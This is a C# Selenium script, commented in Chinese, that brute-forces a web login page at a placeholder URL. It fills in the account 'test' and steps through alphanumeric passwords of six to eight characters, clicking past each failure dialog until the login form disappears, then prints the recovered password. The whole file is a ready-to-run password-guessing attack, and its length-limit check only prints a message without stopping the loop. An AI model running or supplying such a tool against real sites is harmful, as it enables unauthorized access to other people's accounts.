// See https://aka.ms/new-console-template for more information
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using System;
using System.Text.RegularExpressions;

var _url = "http://xxxxxxx";
string data = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890";
//密碼最小位數
var lowtest = 6;
//密碼最大位數
var hightest = 8;
string passwordPattern = @"^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)[a-zA-Z\d]{6,15}$";
var passwordDataArray = data.ToCharArray();

//破解帳號
var account = "test";
var password = string.Empty;
var trytime = 0;

IWebDriver driver = new ChromeDriver();
//開啟網頁
driver.Navigate().GoToUrl(_url);
//隱式等待 - 直到畫面跑出資料才往下執行
driver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(5);


while (true)
{
    try
    {
        _= driver.FindElement(By.CssSelector("input[type=text]")).Displayed;
    }
    catch (Exception ex)
    {
        Console.WriteLine("正確密碼: " + password + " , 總共嘗試 " + trytime + " 次");
        break;
    }
    IWebElement inputAccount = driver.FindElement(By.CssSelector("input[type=text]"));

    inputAccount.Clear();
    inputAccount.SendKeys(account);

    IWebElement inputPassword = driver.FindElement(By.Id("login_password"));
    inputPassword.Clear();
    password = PasswordAppend(password); 

    if(password.Length > hightest)
    {
        Console.WriteLine("無法找到密碼");
    }
    inputPassword.SendKeys(password);

    IWebElement submitButton = driver.FindElement(By.ClassName("btn_001"));
    submitButton.Click();
    trytime = trytime + 1;
    Console.WriteLine("第"+ trytime + "次測試:" + password);

    IWebElement badRequestButton = driver.FindElement(By.ClassName("modal_btn_confirm"));
    badRequestButton.Click();
}



 string PasswordAppend(string pw)
{
    if (string.IsNullOrEmpty(pw))
    {
        //產生初始位數的密碼
        pw = GenerateNewPassword(lowtest);
    }

    Regex rgx = new(passwordPattern);
    while (true)
    {
        pw = FindNext(pw);
        if (rgx.IsMatch(pw))
        {
            break;
        }
    }
    return pw;
}

string FindNext(string pw)
{
    var psArray = pw.ToCharArray();

    //從最後一位開始 + 1
    for (int x = psArray.Length - 1; x >= 0; x--)
    {
        var pwDataPosition = Array.IndexOf(passwordDataArray, psArray[x]);

        //當前位如果不是資料最後一位則自動 + 1
        if (pwDataPosition != passwordDataArray.Length - 1)
        {
            psArray[x] = passwordDataArray[pwDataPosition + 1];
            if (x != psArray.Length - 1)
            {
                for (int y = x + 1; y <= psArray.Length - 1; y++)
                {
                    psArray[y] = passwordDataArray[0];
                }
            }
            break;
        }
        else
        {
            if (x == 0)
            {
                lowtest += 1;
                pw = GenerateNewPassword(lowtest);
                return pw;
            }
        }
    }

    return new string(psArray);
}

string GenerateNewPassword(int count){

    string pw = string.Empty;
    for (int i = 0; i < count; i++)
    {
        pw += passwordDataArray[0];
    }

    return pw;
}
